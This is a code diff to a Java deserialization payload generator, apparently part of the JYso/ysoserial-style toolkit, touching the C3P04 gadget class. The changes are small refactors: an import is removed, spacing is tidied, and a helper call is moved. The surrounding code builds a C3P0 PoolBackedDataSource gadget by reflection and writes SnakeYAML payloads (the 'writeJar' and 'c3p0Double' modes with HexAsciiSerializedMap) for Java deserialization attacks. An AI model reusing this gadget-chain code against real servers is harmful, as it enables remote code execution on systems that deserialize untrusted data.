@@ -6,7 +6,6 @@ import com.qi4l.JYso.gadgets.annotation.Authors;
 import com.qi4l.JYso.gadgets.annotation.Dependencies;
 import com.qi4l.JYso.gadgets.utils.HexUtils;
 import com.qi4l.JYso.gadgets.utils.Reflections;
-import com.qi4l.JYso.gadgets.utils.SnakeYamlUtils;
 import org.apache.naming.ResourceRef;
 
 import javax.naming.NamingException;
@@ -53,8 +52,8 @@ public class C3P04 implements ObjectPayload<Object> {
             throw new IllegalArgumentException("Command format is: <type>:<cmd>");
         }
 
-        String[]             parts = command.split("-");
-        PoolBackedDataSource b     = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
+        String[] parts = command.split("-");
+        PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
         Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(parts[0], parts[1]));
         return b;
     }
@@ -93,14 +92,14 @@ public class C3P04 implements ObjectPayload<Object> {
                 case "writeJar":
                     String[] parts = cmd.split(":");
                     try {
-                        yaml = SnakeYamlUtils.createPoC(parts[0], parts[1]);
+                        yaml = com.qi4l.JYso.gadgets.utils.Utils.createPoC(parts[0], parts[1]);
                     } catch (Exception e) {
                         throw new RuntimeException(e);
                     }
                     break;
                 case "c3p0Double":
                     try {
-                        byte[] data      = HexUtils.toByteArray(Files.newInputStream(Paths.get(cmd)));
+                        byte[] data = HexUtils.toByteArray(Files.newInputStream(Paths.get(cmd)));
                         String hexString = HexUtils.bytesToHexString(data, data.length);
                         yaml = "!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\n" +
                                 "userOverridesAsString: HexAsciiSerializedMap:" + hexString + ";";
